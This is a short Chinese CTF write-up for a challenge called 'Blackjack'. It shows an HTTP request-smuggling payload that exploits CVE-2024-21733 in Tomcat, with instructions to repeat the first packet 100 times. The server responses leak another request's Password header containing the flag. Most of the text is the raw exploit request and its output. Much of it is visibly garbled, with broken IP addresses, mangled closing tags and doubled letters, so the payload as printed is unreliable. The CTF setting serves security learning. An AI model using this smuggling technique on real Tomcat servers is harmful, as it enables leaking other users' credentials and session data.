---
tags: [HTTP请求走私, CVE-2024-21733, Tomcat, 信息泄露]
---

# Blackjack

hint给了CVE-2024-21733

https://mp.weixin.qq.com/s/O2THHzaaLzdWvJldYPwu6g

现在需要的是一个有回显的报错



Task prompt： hint1:CVE-2024-21733 2:POST Upload file可能有用：https://github.com/LtmThink/CVE-2024-21733第一个包重复打100次， 然后发第二个和三个

```
GET  /check  HTTP/1.1
Host :  8 .147 .133 .38:38083
Accept :  *片
POST  /where_is_my_flag  HTTP/1.1
accept-language :  zh ,en-US;q=0 .9 ,en;q=0 .8 ,zh-CN;q=0 .7
accept :  text/html ,application/xp ,iq=0 .8 ,asdasdssdad
Password :  u7ic5VQpssssec1Wk}
Host :  8 .147 .132 .32:29386
Connection :  keep-alive
Content-type :  application/x-www-form-urlencoded
Content-Length :  70

Host :  8 .147 .132 .32:29386
Connection :  keep-alive

TRACE  /  HTTP/1.1
POST  /check  HTTP/1.1
Host :  8 .147 .133 .38:38083
Test :
sssssssssssssssssssdsssddssssssssssssssssssssassssssssssssssssssssssssssssssss ssssssssssssssssssssssssssaasdddddddddddddddddddd
Content-Type:  multipart/form-data;  boundary=----GET  /  HTTP/1.1
Content-Length :  22

------GET  /  HTTP/1.1
```

可以在Tomcat的内存里组装出来三个请求 ③

```
HTTP/1.1  200
Content-Type :  text/plain;charset=UTF-8
Content-Length :  2
Date :  Sun ,  08  Sep  2024  19:23 :24  GMT

okHTTP/1.1  404
Vary :  Origin
Vary :  Access-Control-Request-Method
Vary :  Access-Control-Request-Headers
Content-Type :  application/json
Transfer-Encoding :  chunked
Date :  Sun ,  08  Sep  2024  19:23 :24  GMT

Keep-Alive :  timeout=60
Connection :  keep-alive

59
{"timestamp " : "2024-09-08T19:23 :24 .683+00 :00 " , "status " :404 , "error " : "Not Found " , "path " : "/"}
0

HTTP/1.1  405
Allow :  HEAD ,  DELETE ,  POST ,  GET ,  OPTIONS ,  PUT
Content-Type:  message/http
Content-Length :  197
Date :  Sun ,  08  Sep  2024  19:23 :24  GMT

TRACE  /error  HTTP/1.1
password :  WMCTF{38586288-817b-435b-a917-8731fc051a72 B
host :  127 .0 .0 .1:80800
connection :  keep-alivee
content-type :  application/x-www-form-urlencodedd
content-length :  00
HTTP/1.1  400
Content-Type :  text/html;charset=utf-8
Content-Language :  en
Content-Length :  435
Date :  Sun ,  08  Sep  2024  19:23 :24  GMT
Connection :  close

<!doctype  html><html  lang="en"><head><title>HTTP  Status  400  –  Bad
Requestdtitle><style  type= "text/css ">body  {font-family:Tahoma ,Arial ,sans - serif;}  h1 ,  h2 ,  h3 ,  b  {color:white;background-color:#525D76;}  h1  {font -
size:22px;}  h2  {font-size:16px;}  h3  {font-size:14px;}  p  {font-size:12px;}  a {color:black;}  .line  {height:1px;background-color:#525D76;border:none;}
dstyle> dhead><body><h1>HTTP  Status  400  –  Bad  Request dh1> dbody> dhtml>
```

